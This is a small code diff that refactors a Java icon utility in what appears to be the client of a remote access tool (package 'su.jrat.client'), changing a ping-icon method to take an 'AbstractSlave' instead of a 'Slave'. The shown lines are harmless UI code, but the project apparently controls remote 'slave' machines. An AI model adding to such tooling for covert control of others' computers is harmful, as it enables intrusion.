@@ -8,8 +8,8 @@ import javax.swing.Icon;
 import javax.swing.ImageIcon;
 import javax.swing.filechooser.FileSystemView;
 
+import su.jrat.client.AbstractSlave;
 import su.jrat.client.Main;
-import su.jrat.client.Slave;
 import su.jrat.client.ui.frames.Frame;
 
 
@@ -34,7 +34,7 @@ public class IconUtils {
 		return getIcon(name, true);
 	}
 
-	public static ImageIcon getPingIcon(Slave slave) {
+	public static ImageIcon getPingIcon(AbstractSlave slave) {
 		int ping = 0;
 		if (slave.getPing() < 50) {
 			ping = 0;
